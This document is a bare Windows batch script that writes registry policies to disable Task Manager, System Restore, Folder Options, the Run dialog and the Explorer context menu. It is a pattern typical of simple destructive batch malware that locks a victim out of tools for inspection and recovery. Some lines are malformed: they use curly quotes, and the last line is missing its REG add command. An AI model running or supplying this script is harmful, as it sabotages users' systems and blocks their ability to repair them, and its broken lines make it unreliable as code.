@echo off
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisableTaskMgr /t REG_DWORD /d 1 /f
REG ADD “HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore” /v DisableSR /t REG_DWORD /d 1 /f
REG add “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer” /v NoFolderOptions /t REG_DWORD /d 1 /f
REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f
